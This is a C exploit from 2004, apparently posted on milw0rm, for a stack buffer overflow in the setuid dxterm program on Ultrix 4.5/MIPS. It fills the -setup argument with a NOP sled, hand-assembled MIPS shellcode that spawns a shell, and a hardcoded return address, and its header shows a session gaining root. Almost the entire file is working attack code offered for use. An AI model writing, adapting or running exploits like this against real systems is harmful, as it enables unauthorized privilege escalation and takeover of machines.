/* Ultrix 4.5/MIPS dxterm exploit
  by ztion in 2004
  Greets to: Stok, sidez

  It wasn't possible to use '/' in the shellcode. Probably dxterm only
  copies everything after the last slash, as it expects a path.
  Since everything is pretty much hardcoded, you will probably have to
  tweak it for versions other than 4.5

  nora> ./ultrix_dxterm_4.5_exploit
  $ id
  uid=268(ztion) gid=15(users)euid=0(root)
*/

#include <stdio.h>

#define NOP 0x25f8e003
#define RET 0x7fffbe90

char shellcode[] = {
       0x69,0x6e,0x19,0x3c,    /* lui   $t9, 0x6e69 */
       0x2e,0x61,0x39,0x37,    /* ori   $t9, $t9, 0x612e */
       0x38,0x01,0xb6,0x23,    /* addi  $s6, $sp, 312 */
       0x01,0x01,0x39,0x23,    /* addi  $t9, $t9, 0x0101 */
       0xf0,0xfe,0xd9,0xae,    /* sw    $t9, -272($s6) */
       0x73,0x68,0x19,0x3c,    /* lui   $t9, 0x6873 */
       0x11,0x11,0x06,0x24,    /* li    $a2, 0x1111 */
       0x11,0x11,0xc6,0x38,    /* xori  $a2, $a2, 0x1111 */
       0x2e,0x2e,0x39,0x37,    /* ori   $t9, $t9, 0x2e2e */
       0xf0,0xfe,0xc4,0x26,    /* addiu $a0, $s6, -272 */
       0x01,0x01,0x39,0x23,    /* addi  $t9, $t9, 0x0101 */
       0x3f,0x01,0x02,0x24,    /* li    $v0, 319 */
       0xfc,0xfe,0x42,0x20,    /* addi  $v0, $v0, -260 */
       0xf4,0xfe,0xd9,0xae,    /* sw    $t9, -268($s6) */
       0xe8,0xfe,0xc4,0xae,    /* sw    $a0, -280($s6) */
       0xf8,0xfe,0xc6,0xae,    /* sw    $a2, -264($s6) */
       0xec,0xfe,0xc6,0xae,    /* sw    $a2, -276($s6) */
       0xe8,0xfe,0xc5,0x26,    /* addiu $a1, $s6, -280 */
       0xcc,0xff,0xff,0x01     /* syscall */

};

int main(void)
{
       char buf[256];
       int i;

       memset (buf, 2, 255);
       i = 0;
       while (i <= 8) {
               ((int *)(buf+1))[i] = NOP;
               i++;
       }

       memcpy (buf+33, shellcode, sizeof(shellcode));

       ((int *)(buf+3))[29] = RET;
       /* 119 - 122 is the return address */
       buf[123] = '\0';

       execl ("/usr/bin/dxterm", "dxterm", "-display", "localhost:0", "-setup", buf, NULL);
}

// milw0rm.com [2004-12-20]